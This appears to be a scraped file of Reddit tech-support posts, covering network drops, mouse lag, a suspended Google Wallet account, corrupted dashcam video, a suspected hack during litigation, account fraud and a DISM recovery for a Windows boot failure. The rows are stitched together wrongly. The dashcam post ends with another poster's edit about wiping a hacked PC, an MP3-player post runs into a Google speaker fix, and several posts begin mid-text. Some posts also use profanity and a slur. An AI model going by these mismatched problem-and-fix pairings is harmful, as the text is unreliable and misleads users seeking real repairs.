i tried every single fucking advice in this thread and not a single one worked. i might just be a retard with computers or just unlucky, but i still appreciate alllllll the help i got. words cannot describe how this community helped me through a tough battle. the thing that worked for me was a windows 10 on a memory stick. i formatted my c drive so everything was gone because some of the advice was just time-consuming and i am one lazy moherfucker. so after formatting it i installed windows 10 on it. actually. before windows 10 i installed a brand new windows 7 on it, but the internet drivers would not work so hours later i gave up and tried windows 10 instead. and guess what it fucking worked. it might sound simple to you, but it was wayyyyyyy moooore difficult than i make it sound.

99r60w,"I'm using Excel for an inventory database that I KNOW Access can do better. There are a few things I need to know how to do, then I should be able to get it going in Access.","I've got an Excel workbook that's got 198 sheets.  In the first sheet (my ""inventory"" sheet) are 197 box numbers with barcodes and scope of contents.  The box numbers are hyperlinked so that when you click on box 146, it goes to sheet 146 where you can see the contents of the box, along with a ton of other data that goes with each object in the box.  

It's like clicking on something to see inside the box.  I have no idea how to make that happen in Access.  

Also, I'd like to be able to have a form that someone could fill out, that would not add a record to a table... but alter whichever records they specify in the form.  In each box, is 30+ film reels.  A patron asks us for a clip from a reel, so we have to fill out the request, show that it's been requested and by whom, then possibly even do some stuff that's impossible (like automatically opening a query with information needed by the digitization vendor, etc).

8h2qwl,Wall ethernet port generally goes out from 12pm to 4-5pm daily. Main modem/router never have issues. Not sure what to troubleshoot next.,"Background: My room is at the opposite end of the house from where the modem and primary router are installed. The modem/router is a Fios-G1100. The wireless connection is use-able but way too inconsistent from my room. 
My room doesn't have an ethernet port, but I recently remembered the room next to me does. I tested it with my old laptop and it was working fine. So, a few weeks back I bought a NetGear AC1200 after work, plugged it into that wall port, and was immediately connected to the internet with no problems. 

Next day's afternoon I lose internet access to the dreaded DNS server error on the new router. I changed the router's DNS servers to Google's but nothing changed. Then later in the day the connection was back to normal like it never dropped at all. 

This has been going on for a few weeks now. The internet and wifi from that wall port will work perfect in the morning and at night then BOOM. No connection mid day for all devices using it. 

To rule out the new router, I'll connect my old laptop to the ethernet port during these outages. Most of the time the computer will tell me the ethernet cable is unplugged. Other times it will say the ip is not configured. 

All the while the main router is having zero issues. 

Things I've done to troubleshoot:

* Using an alternate ethernet cable
* Reset the Fios-G1100 modem/router
* Check the cables on the modem/router
* Check to make sure the wall port is secured

I'm not sure where to go from here. I think it may be an infrastructure problem but the fact that the internet does work sometimes is giving me doubts. 

Any suggestions for how I can troubleshoot further?

89zqpi,"Removing Cortana instantly fixed 75% of my mouse lag issues, and I'm wondering what else I could do to fix the last 25%","I've been pulling my hair out for 50+ hours trying to get my new computer (P51 Thinkpad) to run smoothly.  The main issue here is mouse lag, specifically while interacting with Flash generated 'slides' within Chrome, which I need to do all day long for work.

I've tried everything from uninstalling, reinstalling, and updating all my drivers, to doing the same for all my programs, to completely restoring and wiping my computer and starting over.  Nothing has completely fixed this issue.  

My mouse stutters every 3-5 seconds while I move it within the slides I mentioned. 

Some people were saying Cortana causes mouse lag, so I got rid of her, and saw instant improvement.  Still not 100% smooth, so I'm looking for more things to try.

I've also noticed the mouse lag mostly goes away if I make the window I'm working in very small, or scale down the 'slides', but that isn't a permanent fix since I need to be able to see what I'm doing on the screen!

Any ideas?

**Edit:** Thanks for all of the ideas so far guys, I have tried almost all of them, and nothing has completely fixed the issue.  

Something I want to emphasize: the mouse will be perfectly smooth and responsive while it is on the page, but outside of the Flash slides.  The moment the cursor crosses onto the slides, the stuttering begins.

86ln5z,Google Wallet Account does not comply with ToS. Account of at least 8 years suspended with no appeal. This account is used for everything I do. Please help,"On March 13, I received an email titled 'ID NUMBER Your Google Pay Account'. It said this:

&gt;It has come to our attention that activity in your Google Wallet Account does not comply with our Terms of Service. As a result, your account has been closed. It is our policy to not discuss the specific reasons for an account closure.
Due to the reasons relating to your account closure, no further adjustments will be available on any existing transactions or balances in your account.

Despite all the official logos, links and email address, I assumed it was a scam and left it ignored. I keep using everything as normal.

Today, I was in a mobile game and wanted to make an in-app purchase, was then told my payments methods were invalid. 

I get on the phone with the google play customer support because I realise at this point, something was wrong with my account.

Long story short the phone call told me the following:

* My payments account has been closed with no appeal due to breaking ToS
* There is nothing I can do
* Subscriptions can continue to be purchased and used
* Create a new account, it's easier

I am a very dedicated Google account holder. I use the play store, Google Music, Google Drive, I own a Home Mini, a Pixel 2XL, previously a Nexus 5x and Nexus 4 and Nexus 9. I have paid so much money and used so much of Google's services. Yet this is just a kick in the teeth. 

I know that just spending money on them does not justify ridiculous expectations, but surely this is too far? The only thing that I could think of that could have affected my account was a refund. In Dec, I purchased the Pixel 2XL when there was a £100 discount. A week later, I found a further discount elsewhere which was offering £130 off. I was told by Reddit users that I could ask for a refund due to Price Protection(I think that's what it's called). I contacted support and they happily provided me with the refund, no issues, quick emails and refund.

Otherwise, I have not had any issues at all with Google. 

In addition, whilst I was on the phone, I received an email title 'Fraud Protection Alert - Important Information about your Google account'. Details:

&gt; Protecting your account from potential fraud is a matter we take very seriously. Due to suspicious activity, your Google Payments account has been temporarily closed.
To reactivate your account, please sign in to support.google.com/payments/contact/verification to verify your information. This process takes just a few minutes and, once complete, we’ll get back to you shortly.

I tried to use the verification link but it only takes me back to the 'Google payments Help Centre' page. I have tried using different browsers and computers but it won't work.

The support on the phone was sympathetic but did not provide anything more. I am now at a loss with what to do. This account means a lot to me and I need it. I don't want to create a new one and just give everything I have up.

84ej97,"Corrupted dashcam .MOV files, and I need them to settle a disputed car accident","Hey everyone, 
I was involved in a car accident late last night. On the way home from work, a woman ran a red light at an intersection which resulted in me T-boning her van. Everyone was fine, and the cops arrived shortly after. I have no doubt of my right of way, having the green light, and her being 100% at fault. Fortunately my dash cam captured the entire incident, and I alerted the police of its presence at the scene. They asked to see the footage, so as to issue her a citation, but I was shaken up and could not get the files to play at that moment. I told them I would go home and transfer the files to my computer so I could send them to my insurance company. 

Unfortunately, when I attempted to view the files on both my PC and Mac, I received error messages and the files could not be played. I have spoken to my insurance company, and they informed me that she is disputing the events of last night, therefor leaving the claim as word v. word, which means I have no means of compensation for the accident. I again stressed that I am in possession of a dash cam, and they said they would contact her and remind her of that, being that she filed her claim online, rather than with a person. I'm not a wealthy person, but I am an excellent driver. I am so frustrated by the outcome of this, and I'm afraid I will be left carless and in deep financial trouble if I can't settle this claim in my favor.

Can someone help my view these corrupted files? I have tested the camera before and have pulled video off of it plenty of times, but it seems as though the impact of the accident corrupted them. It's a pretty cheap camera but it has worked fine until now. I have googled a few solutions but nothing has helped as of yet. I have the files available to send if need be. Thanks for reading. 

EDIT: SOLVED. THANKS! 

EDIT 2: The software I used was the one suggested by u/tito13kfm from Grau GmbH, called Video Repair Tool. The program takes an existing working video from your camera source and compares it to the corrupted file in order to fill in the missing parts with usable data. I ended up paying 29 euros for 5 video repairs, which is insane, but I suppose these companies rely heavily on desperate people. Either way, it was well worth it since it allowed me to demonstrate to the insurance companies my claim of having a green light. I was on the phone with an agent while she watched the video:

her: ""Ouch, just saw the accident.""

me: ""Yeah.""

her: ""You had the green.""

me: ""Yes.""

her: ""Clear as day.""

me: ""Clear as day.""

EDIT: Thanks for all of your suggestions and help through this. My entire computer has been wiped clean, with a clean install of windows.

I am in the process of now changing all of my passwords, and have already contacted Amazon about the purchases, and notified my banks. Luckily I had none of my banking information or passwords stored on my computer, and my Amazon account only has access to my Amazon Store Card. If they tried to use anything other than that primary card, they would have needed to have the entire information of those other cards. Everything that can be, is now set up for two step verification, and I'm hoping this never happens again. God bless you all for your help, I'm very glad to know it wasn't something I downloaded and clicked on. If you have any other suggestions, please feel free to provide them. Have a great night.

808509,Skip Windows 10 Password Overlay,"Difficult to put into words but hopefully I'll do a good job. 

I've recently migrated from Windows 7 to Windows 10. On Windows 7, if you lock your screen and go away, the screen is always on [this](https://i.imgur.com/RzVzE8s.jpg) screen, ready for the password.
On Windows 10, [this](https://i.imgur.com/u8PY4St.jpg) screen takes precedence, requiring to be moved out of the way before you can enter your password.
I live in an unsecure environment and leaving my computer without a password or unlocked is not an option, but I now find myself coming back to my computer, entering my password and getting it wrong every time, as there's an overlay in the way.

Is there a way to bypass this overlay and keep the password prompt permanently in place?

It may seem a little unnecessary or inconsequential, but it's a genuine quality of life improvement I'd really like to know.

Thank you to anyone!

7xy9zp,How can I tell if our computer has been hacked within ongoing litigation? Mounting evidence suggests they hired company to get access to computer/email and need help understanding what to look for and/or next steps to resolve.,"Hi TechSupport,
I am cross-posting this to you, /r/legaladvice, and /r/HowToHack so while the context is broad, there is a specific need for your help/input. 

**Backstory Summary**

Over the last 6 months of litigation (elder abuse, dementia, trust) signs have occasionally appeared that the other side might have access to information which could only be accessed via hacking one or more of our personal computers. There has always been alternative explinations for how the information was gained, until this last weeks hearing. This is all taking place in a very small midwestern town which is exhibiting corruption, collusion, and harrassment (added for context).

* Information only available on one laptop (my aunt) was included in hearing document.

* My aunt had a bitter divorce many years ago during which time she heard was told by a third party that her now-ex husband hacked her computer.

* The ex-husband is involved with the other side of the ongoing litigation as he owns the main law firm in this town. 

* We have received unconfirmed information that a small software dev company in this small town has been hired in the past to hack peoples computers. Namely that this was the company used by my aunts ex-husband to hack her during the divorce. Others have shared that they learned about this companies services during their own divorces.

*A partner in the ex-husbands law firm is married to the owner of the aforementioned software dev company. 

**Specific Questions**

With all of this in mind we and our lawyers have concluded that the possibility of hacking must be addressed but do not know where to start. Keeping in mind we have a single small town lawyer (passionate and skilled but with limited resources) I am helping from a distance with support functions like this. I have a good knowledge of computers but in regards to hacking my skillset is limited to identifying abuse/use of passwords. With the external company now identified, no password abuse, and all passwords having been reset with 2-factor authentication I need to ask for help.

1. What sort of hacking services might a small town software dev company offer? Alternatively what are common hacking services/methods within personal litigation such as divorce?

2. How can one go about identifying elements of hacking? Not removal of, but confirming hacking has taken place.

3. Should hacking be confirmed, what methods (if any) are available to link the hack to the company/individual?

4. Are their any recommended consultants/companies/services to hire which can pursue 2+3 on our behalf? 

5. Do you have any general suggestions/advice on how to best pursue this?

This is an incredibly difficult, emotional, and bitter litigation which is mainly affecting my parents whom I am trying to support via methods such as this. Thank you so much for your input and if any additional information is needed to assist with your feedback just let me know.

7sr3ed,"SOLVED - ""Haunted"" Samsung S6 - garbled voices coming from speaker and inoperable phone.","I would like to document an interesting phone repair case. 

I was asked to help with a friend's S6. He lost it at a party and recovered it a few days later. 

The phone screen would not turn on, but would vibrate in rapid bursts when touched. The back &amp; app drawer buttons would vibrate rapidly instead of once, as usual. The only way we could tell it wasn't dead was the alarms. 

Each day, the same few alarms would play. During the alarms, a garbled, robotic voice would intermittently say some nonsense, almost like the phone was haunted. 

We tried to recover the data, and while the phone would charge, it would not mount on a PC. 

I first suspected water damage. But that didn't make sense - the motherboard would have shorted along with the screen &amp; speaker. Besides, the garbed sound from the speaker was intermittent - the alarm chime was clear. 

Next I focused on the sound - the garbled text sounded like very rapid robotic...speech? Was this something to do with accessibility settings? 

I tried using the power button to restart the phone, but no success even after holding for 30+ seconds. A few days later I had the idea to try a ""safe mode"" hard restart, holding down the power and volume down buttons.

It finally booted up - to a nightmare of a screen. The phone was layered with so many accessibility assistants it was ironically impossible to use! I couldn't navigate the traditional way - you had to drag-select and double-tap to choose something. The sound was, indeed, a very sped-up screen-to-speech assistant of some sort. 

Also turns out the USB port is fully functional, but was cock-blocked by Sammy's ""authorize data transfer"" prompt. 

Samsung thankfully made a ""reset settings"" button, one restart later the device is as good as new. One of the weirder  cases I've dealt with. ",https://www.reddit.com/r/techsupport/comments/7sr3ed/solved_haunted_samsung_s6_garbled_voices_coming/,1516833370.0,77,0.95,7,techsupport,alextheracer

7sbihd,"How-To: Fix ""INACCESSIBLE_BOOT_DEVICE"" caused by Win10 Spectre builds 16299.125 or 16299.192.","DISCLAIMER: You're going to be messing with your system files in this.  Your PC is already screwed.  If you mess this up it's possible to make the problem worse.  I am not responsible or liable for anything that happens as a result of you incorrectly implementing the steps in this document.  
  
**THE PROBLEM**  
Some of you may be aware that Microsoft's latest builds of Windows 10 are bricking some older machines by making their boot device disconnect mid-boot.  I want to note that while MS says this is limited to AMD devices - my machine that suffered this was an i7 3770 on a z68 gigabyte UD3 motherboard running the latest bios.  The absolute worst part about all of this is they come down as mandatory updates without warning.  This is difficult to fix - but it can be done if you have access to the Advanced boot options and can get the command prompt.  
  
So, lets start with the offending KB's: [KB4054517](https://support.microsoft.com/en-us/help/4054517/windows-10-update-kb4054517) and [KB4056892](https://support.microsoft.com/en-us/help/4056892).  If you have a computer running x58 or z68 and your windows is still working...  DEFINITELY DO NOT INSTALL THESE.  This also applies to *ALL AMD SYSTEMS* to my knowledge.  You'll note that MS states this is resolved by [KB4056892](https://support.microsoft.com/en-us/help/4073290/unbootable-state-for-amd-devices-in-windows-10-version-1709), but that is not my experience.  Installing either of these will make your PC unable to boot.  
  
**THE FIX**  
The first thing you need to do is determine if you're on build 16299.125 or 16299.192.  If you are on 16299.125 you will have to do an extra step of first installing 16299.192.  If you are on 16299.125, you will also need a USB stick that can hold 650MB for the 16299.192 CAB file.  
  
1. Boot into Advanced recovery mode using either your recovery partition or some installation media.  You should be able to let your computer restart until it offers you Automatic Repair with ""Restart"" and ""Advanced Options"" then click on ""Advanced Options.""  
2. Choose ""Advanced Options,"" ""Troubleshoot"" then ""Command Prompt.""  
3. Identify your system disk, mine loaded up as E:, but you may end up on a different drive letter - which will affect the majority of the commands, change anywhere you see e: below.  You can do this by switching to the various disks, and using *dir* to look at the filesystem until you find your system disk.  
4. Switch to your system disk and create a temporary folder: mkdir temp  
5. Run **DISM /image:e: /scratchdir:e:\temp /get-packages**  
6. Verify you have a 16299.125 or 16299.192 build in the list.  It will likely be one of the most recent updates.  
  
**IF you are on 16299.192.x.x**  
  
1. Disable any possibility of network access to the computer.  Unplug the ethernet cable, or unplug the wifi card.  This is so windows doesn't just go and re-upgrade the machine.  
2. Use your mouse to highlight the *Package Identity* value, in my case: *Package_for_RollupFix~31bf3856ad364e35~amd64~~16299.125.1.6*  
3. Run **dism /image:e: /scratchdir:e:\temp /remove-package /packagename:Package_for_RollupFix~31bf3856ad364e35~amd64~~16299.125.1.6**  
5. Use your mouse to highlight the *Package Identity* value, in my case: *Package_for_RollupFix~31bf3856ad364e35~amd64~~16299.192.1.9*  
6. Run **dism /image:e: /scratchdir:e:\temp /remove-package /packagename:Package_for_RollupFix~31bf3856ad364e35~amd64~~16299.192.1.9**  
7. This should complete successfully and a reboot will get you going.  
8. Continue onto disabling windows update section below.  
  
**IF you are on 16299.125.1.6**  
  
1. Fortunately, you can supersede this update with the other broken update *16299.192.1.9* noted above.  
2. Unfortunately, this means you need a second computer to solve the problem, running an unaffected windows install.  
3. Using your second, working computer, Download [KB4056892](https://support.microsoft.com/en-us/help/4056892) update from microsoft to get the .MSU file.  
4. Create a temp folder on the C: drive of your working computer.  
5. Unpack the .MSU file to get the .CAB file so you can manually install 16299.192.1.9 using DISM with the command **expand -F:* windows10.0-kb4056892-x64_a41a378cf9ae609152b505c40e691ca1228e28ea.msu c:\temp**  
6. Copy the expanded KB temp file to your usb stick.  It should be named **Windows10.0-KB4056892-x64.cab**  
7. Plug the USB stick into the computer that won't boot, and identify the drive letter assigned to the USB stick as previously done to identify the system drive.  In this case, mine was I:  
8. Use DISM to install the package: **DISM /image:e: /scratchdir:e:\temp /add-package /packagepath:i:\Windows10.0-KB4056892-x64.cab**  
9. If this completes.  Exit the command prompt and restart your PC.  Let it crash a couple times then follow the instructions for **16299.192.1.9** above.  
  
**Disabling Windows Update**  
This is where things get really bad.  Windows Update will automatically reinstall one of these two updates, leaving your PC unbootable again.  This is why we airgapped the computer earlier by disabling network access entirely.  If you're on Windows 10 Pro, you can disable Windows Update until this gets sorted out.  If not - you'll need to explore other options.  
  
1.  Create a system restore point immediately before doing anything else.  System restore will allow you to recover from this problem an infinite amount of times by resetting your PC to this state.  You'll lose program updates, and some other things, but saved documents, etc, should be safe.  
2. Click start and type **gpedit.msc** to load the group policy editor.  
3. Expand *Computer Configuration -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows Update*  
4. Change ""Do not display 'Install Updates and Shut Down' option in Shut Down Windows dialog box""  to **Enabled**  
5. Change ""Do not adjust default option to 'Install Updates and Shut Down' in Shut Down Windows dialog box to **Enabled**  
6.  Change ""Configure Automatic Updates"" to **Disabled**  
  
This should prevent Windows Update from bricking your machine again.  Hunker down and wait for the dust to settle.  Eventually they should get this sorted out and have an update that will fix your machine while not leaving it unbootable.

7qzwyz,"Every single time my girlfriend unlocks her phone, WiFi is slow for all!?","This is an interesting one..
For a long time, I have had issues with my internet connection. The router is in the living room, and my computer is in the office, 5-6 meters away, using wifi. The signal is steady and fine for the most time, but occasionally it drops out for about 2-3 seconds. Sometimes more often than others. I assumed it was a shitty ISP, so didn't look into it. It took a year before I found the real source. 
Recently, I've been playing PC-games on my TV using an NVIDIA Shield. It allows me to run games on my PC and stream them to the TV in the living room, so I play it from there. I was sitting there with my girlfriend, and suddenly noticed that every time she unlocked her phone, I got that same hiccup. The lag and quality-drop was instant. We tested it several times. Every time she opened her phone, I had extremely poor wifi-signal on my PC in the office. After the initial few seconds, everything is fine, even though she's still on the phone. It just happens as soon as she ""starts up"" the phone from a locked state. She has some Samsung shit. This does not happen with my iPhone.

7pffx2,Woke up to PC blaring out a numbers station.,"I realize this sounds like a shitty nosleep story (like there are any good ones amirite), but this is real, and I’m concerned.

Windows offered me an update last night, which I set to install at 6:53am (several hours after I stopped using it). At about 7:50am, I was woken up by my girlfriend scared out of her mind as to what was going on. I was half-asleep and didn’t pick up on it at first, but once she pointed out the noise, I could hear a numbers station being played from the other room. It was coming from my PC, so I tried to login to see what was playing it, and couldn’t login. Here’s the frustrating part: I had recently changed my password and can’t remember what it was for sure, so I don’t know if i was logging in wrong or if it had been changed. I was able to reset it and login; the broadcast stopped shortly before Windows logged in, and none of the tabs or programs I had open should’ve been playing any audio, let alone a numbers station.

Does anyone know what might cause this? I feel like most malware wouldn’t want to bring attention to itself like that, so I’m confused. Is there any way to figure out what happened?

EDIT: Solved! It was the [Lincolnshire Poacher station](https://www.youtube.com/watch?v=QnXPqUU6fI0) that was playing at the very end of this [video game stream](https://www.youtube.com/watch?v=To8Mjo8l8eI) by /u/jeffgerstmann.

Only the screen's backlight turns on but that's about it. Can anybody help me to save the music?","I tried to find a solution online but apparently nobody uses these old MP3s anymore. I appreciate your help so much! 



UPDATE: 
Seems like not the drivers are the problem but the connection to any device (I tried it with a win10 pc and a win7 laptop). The MP3 Player won't show up anywhere, I checked the device manager and generall usb devices and printer. It looks like the creative only gets power but nothing else.

I tried several drivers but if I can't get a connection first it won't work anyway, please correct me if I'm wrong. 

I think the main problem is that a connection to my PC WOULD be possible but since I can't do anything on the device itself I can't even  click on ""connect to pc"" on the MP3 Player itself. It won't comnect automatically. 

UPDATE: I removed the harddrive very carefully from the MP3-Player. I was able to connect it with my PC but my PC says I have to format the harddrive. What should I do now? 


Thanks to everyone who's trying to help me! It means so much to me.

I need this to stop quickly because it's ruining my playlists and making me go nuts, especially at work!

If I can't get this fixed, I'm defenestrating the device as soon as I get home.

EDIT: Found the solution! 

For anyone who needs help on this, here are the steps I took:

1. I used an old phone and set it up to use only my daughter's Google account. (This can be done using a tablet with more than one user account installed as well)
2. Install Google Home app
3. Open it up and then click the Devices icon (upper right hand corner)
4. Find the speaker (and this is the very important part that cleared it all up for me), and you'll see a blue ""Link to this device"" area. Click that
5. Follow the prompts to set up your phone and train your voice. By doing this, it'll train the voice and upload it to the device and you're good to go.
6. Test it by asking the speaker ""Ok Google, what is my name?""

7g6cte,"My PC was was hacked and now I am out $1,564.95. please help.","I was at my sisters house eating dinner with my family when I looked at my phone and saw 3 push messages; A PayPal payment to OPSkins for $1030.18, a payment to G2A for $534.77 and my Steam Guard sending me a message so I could log into my steam account. I logged onto my email and saw that I had 4 Amazon orders. One for $99.98, then one for $49.99, another for $49.99, and the last one which didn't go through because I didn't have enough money in my checking account.

I called paypal first and filed a claim on the 2 charges saying that I didn't make the purchases. Next I called Chase and said I didn't make those purchases. Then I contacted Amazon and told them what happened. Amazon was able to cancel them right away because they were for Playstation Network cards and they had not been used yet. Here comes the part that freaked me out... PayPal rejected my claim because ""nothing was out of order"". The purchases came from my IP address, on my AT&amp;T internet, and they said everything matched up as if I had been sitting on my home PC and placed the orders. I went onto OPSkins.com (to which I had been banned because I filed the claim through PayPal first) I disputed the ban and told them what happened. They told me it was through my IP address so I was full of it. I was also banned on G2A, but I couldn't find a way to contact them. All of these orders were purchased on my accounts. They logged into my PayPal, my Amazon, my G2A, and my OPSkins accounts. It only stopped them when Steam Guard came up (when I am assuming they tried to trade the skins they bought on my account to another one). I have a surveillance camera in my home, no one was here. Could this have been done through hacking into my network/PC?

Something else that I found out: $1000 was added to my OPskins account, then an additional $500 was added to my account from G2A pay. So there was a total of ~$1500 in my OPSkins account. I asked OPSkins what the last purchases made on my account were and they told me ""Sticker | Martha"". 2 of them. One was sold to me for $999.80, and the other was sold to me for $499.90. The item ""Sticker | Martha"" is $0.48 on the steam marketplace right now. So I am assuming that the person who got into my account was the same person who was selling these items. I contacted OPSkins and asked them what information they could give me of the person who was selling those 2 items. I have been waiting for a reply ever since. I doubt they will do anything about it, but I really hope that I can get some information to report to the authorities.

7d1qog,Did Lenovo tech support literally lose my computer?,"This isn't a traditional tech support question, but one that I really only think could be answered by people in the business. So here's the story, it's long so I appreciate anyone who actually reads it all.


I sent my computer (Lenovo Yoga 3) to their warranty tech support after my dog pulled my computer off the table and the screen busted. After I called about this, but before I sent it in, a few keys completely stopped working when I used the shift key. They didn't just not capitalize, they did nothing at all. I wrote this in the sheet that gets sent with the computer. I either sent it or they received it by 10/20, I admit I can't remember which, but at this point that moot because it's been SO long.

I hear nothing at all from Lenovo, so finally I call 11/1 to ask wtf is happening.  I get told they are waiting on a screen and battery. My paperwork said turnaround should be 5 days. This is pushing two weeks, and they don't even have the part they knew they'd be replacing. I tell that person about the keys and they say that they will make sure this gets passed on and fixed. I'll get an email when it ships. Ok, cool.

Days go by and I hear nothing. I call again. This person initially said they have nothing to say, but then announces not to worry, it's in testing and should be shipping home soon. I ask about the keyboard and they ""check"" and I get reassured this has been fixed. Hurray, back to waiting eagerly.

Couple more days go by, and I call this past Friday. Laptop is in repair process, which will take 1-3 days, then testing which is another day. I start getting pissy here. Why are things going backwards?? I'm not good at assertiveness, so I keep waiting.

Call Monday and learn there are NO updates on my computer beyond 10/25. It is still awaiting at least the battery to be replaced. How the fuck did someone confirm they fixed the keyboard when there is no record since before the day I called and brought it up? Why did anyone claim it was in diagnostics? I get pretty shitty here and demand a supervisor. They say they will expedite and call me back. No call. I call later Monday and get told to hurry up and wait. No contact since.

I have this strong feeling that my computer has been completely lost. Is this possible? It seems like there is some serious covering up going on. Plus, my warranty expired on Monday which means if they send me back a broken computer, there's no way it's ever getting fixed (if I even bothered trusting then again).

75dos7,My laptop got hacked/hijacked! The virus is still there after a reformat and clean install... I need some expert help with this.,"Ok, so my laptop (toshiba satellite, like 2010, with windows 7) got some crazy Trojan that took over my computer till I had no choice but to just do a clean install. The virus/Trojan/root turned my computer into a network, giving people access to my pc. Some of the stuff that it did:

- something called volume shadow copy, looked like it was moving files to this. It made a new dvd drive too, giving me 2 with the one I normally have... not sure why, mebbe as a hd partition made to look like a dvd drive?

- deleted all my restore points and slowly prevented access to several admin tools like event viewer, firewall, ect. It would also not let me use MWB or any other AV. 

- mouse would act weird esp when trying to access admin tools, screen would flash sometimes

- some dude from india called me saying my computer was hacked and he could fix it.... I know they do this all the time, but pretty sure they were actually behind this one. 

Anyways... I did a full reinstall, and it was still there afterwards. Soon as I check task manager, I see lots of svchosts, rundll, and multiple other processes. Stuff like ""DCOM surrogate"" or other stuff. The weird thing was that my network adapter was disabled and still this stuff was running. 

I then did a full reformat, going into cmd window and doing the ""clean all"" function that rewrites whole HDD with 0's so nothing can still be there. I factory reset my cable modem/router and changed passwords too. Virus still seems to be there, if I let it run it slowly shuts off services. 


I think it is either in my bios or boot files, perhaps hiding in ram or something..... or one other thing which I read is that some viruses can create a virtual machine of windows or something, so that it boots at startup and it looks like i'm making changes but only to the copy not the real core one. I don't even get how this is possible if my network adapter is down, unless it just looks like it is down. 


What options do I have? I have tried everything, run several antivirus and kasp root killer.... I updated my BIOS driver hoping it might overwrite any old, corrupt data...

726dpp,Lost 50 GB of space on disc C in 1 day without doing anything.,"Yesterday I had 50 out of 100 GB free space on my computer disc C and now suddenly I get a message  ( I have Win10) that I don't have free space on disc C. I clicked ""My computer"" and so that I have like 500mb of space left.  And as time passes It just continues to lower (now I have 100mb) on its own.  I installed WinDirStat and it shows me that I have like 50 GB in App Data - Local - Temp - Aria debug 12536 and Aria debug 11604  with a ""log"" extension.  It looks like I can get free space by deleting this file but is it safe to do it?  And even if I delete it, won't it just fill itself again in like an hour?  I have this computer for more than a year and nor this problem ever occurred nor have I done anything extraordinary that could have provoked this situation.  Checked with my antivirus, It found nothing, earlier I also checked system protection and it was turned off so that`s not the thing that eats space.

Edit: It looks like the source of the problem was OneDrive sending me system messages for 1+ month. After I deleted .log files, disc C stopped losing space. I'll disable OneDrive and update in a couple of days whether the problem occurred again. Thanks for your help everyone!

Edit 2: Turnes out, Microsoft OneDrive was the root of the problem. Yesterday I decided to see if the problem occurs in case I just let things go on their own without deleting/disabling anything and as I turned on my computer today, disc C started losing memory again and Windows showed that I need some free space in case of updates, though I had only lost nor more than 1 GB. I tried to delete OneDrive through the control panel, but as I hit delete it just shows circle like it is thinking but that's all. So I wait till OneDrive messages me about the need to update, then I right click ""options"" and disable ""turn on as the Windows starts"", then reboot my computer and finally - I am not losing space on disc C anymore. And as a pleasant surprise, my computer is now MUCH less noisy. Thank you all for help and especially /u/Kazamura who was the first to suggest that OneDrive might be the bitch in the house!

717o40,Are my neighbors slowing down my internet connection?,"So here's the deal. I am currently renting a first floor apartment all to myself.

Internet is included in the rent, but my landlord is also renting out the apartment above me, which houses around 8 people.

So our internet is shared. The main unit is stationed in the apartment above mine, and my desktop is connected through an access point with an Ethernet cable (A cable goes from my AP to outside my window, to the upstairs unit)

There were a lot of problems with the internet when I moved in, but a few days ago someone from the ISP came and fixed the issue, suddendly giving me a 70MBps download.

I was really happy with this connection, but just two days later I noticed the speeds dropped to around 15-20 MBps.
After doing some tinkering, I managed to access the main units system settings, and I could see all the people who were connected.

Now my question is this; Are the other clients upstairs slowing my connection down?
And in theory, shouldn't my connection be faster since I am connected by cable?

I concluded after testing my GPU on multiple working rigs that my graphics card died. I called up Gigabyte, and they told me to RMA it to their RMA center which is located in California. I live in Florida so the shipping takes ages. I can see on the tracking information that they have received my card and every time I went to go check the RMA status of my card, no information was showing. I waited a couple of DAYS before I decided to take it upon myself and call them up. The man on the phone told me that they should have it and was quite rude to me. I told him thank you for helping me and taking your time to do that, and we hung up. 2 weeks later... I finally receive my Graphics card :)!!!

6xsyl9,Did Firefox turn into garbage for anyone else recently or is it just me?,"I'm not sure exactly since when but about the time when some addons got the legacy tag, indicating that they'll stop working soon (uBlock already stopped anyway, so I had to update to a development build) Firefox (55.0.3 x64) has started acting more and more shitty. The first thing that started happening is very minor and just confusing a bit, is that now when I open a link, instead of waiting for the official title of the page to load, it immediately displays the URL as the title instead. Some time later this evolved into the fact that about 40% of the time, pages get stuck in loading, until I tell Firefox to go there again. Another thing that started happening a bit later, is that about half the time, when I close a tab, a ghost tab remains, by which I mean that the space for the tab is still there as if the tab was still open, which can mess with how everything is set up, or when I'm used to doing things a certain way and speed.

EDIT: Actually, ever since I tried testing to see if it was addons, I haven't seen any of the problems(apart from the minor thing, which is probably a feature) so I have no idea what happened, or if it's going to happen again, but right now I can't do anything regarding this.

So my wife (30F) died last week. We have a 2.84F daughter who doesn't understand what has happened. Worse is that my daughter is just too little to remember Mummy when she grows older.

Before she lost consciousness my wife kept begging me to make sure that our daughter won't forget her, and that daughter will always know just how much Mummy loved her.

One of the redditors on r/parenting recommended to me that I should make some storybooks and a journal. I have been asking for information and help on some different subs.

Someone has recommended that I should only use an archival quality photo printer, and archival printer inks. I already own a brother printer (DCP-9015CDW) and cannot see if you can get archival toner for this.

Can you please help me with this. I really cannot figure out what is the best printer to buy. Can I just use archival inks in a regular inkjet? 

I want something that will survive for at least 80-90 years (the likely lifespan of my daughter) intact and without fading. If it lasts for future generations, then all the better.

Thanks guys,

6v3bmg,Extremely frustrating and unusual issue. My Laptop boots only when the power button is pressed hundreds of times after removing cmos battery and following a strange procedure.,"I have a very strange issue with my laptop(Hp Pavilion G6 2005AX[It is just its model number and NOT a 2005 model. I bought it in 2013]) and is making me miserable for past one year. I have tried all solutions available on the internet, yet nothing works. I am a student and can't afford to buy another laptop as of now(hoping to buy next year).

This is the issue. When I press the power button, nothing happens. The screen doesn't turn on, the fan doesn't spin and it looks like the laptop is dead.

However, if I do a very specific process, then it turns on after lot of effort -

1. I remove the laptop battery and cmos battery, then I drain any flea power by pressing the power button for a minute.
2. I connect the cmos battery, then I connect power cable(without laptop battery).
3. Then, I keep on pressing the power button hundreds of times. Sometimes it switches on within few clicks especially if the laptop has not turned on for over a day, but otherwise, it will require 100+ clicks on the power button to get that 'magic click' which turns it on.
4. Then it shows the screen saying the CMOS battery is reset as I had removed it and I have to press Enter key within 5 seconds to get it to boot, otherwise it will turn off and I won't be able to turn on again for many hours.
5. When it boots up, it works perfectly with zero issues. I try to keep it on as long as possible, but if it ever gets turned off, it is a pain the ass to get it to turn on again(30 to 100minutes of pressing the power button and going through the above process praying for that magic click.)

Sometimes I have to do the above process twice to get it to turn on. The laptop cannot restart as well. It just turns off if I try to restart. And windows 10 wants to restart all the time for updates...

**I have tried the following things till now -**

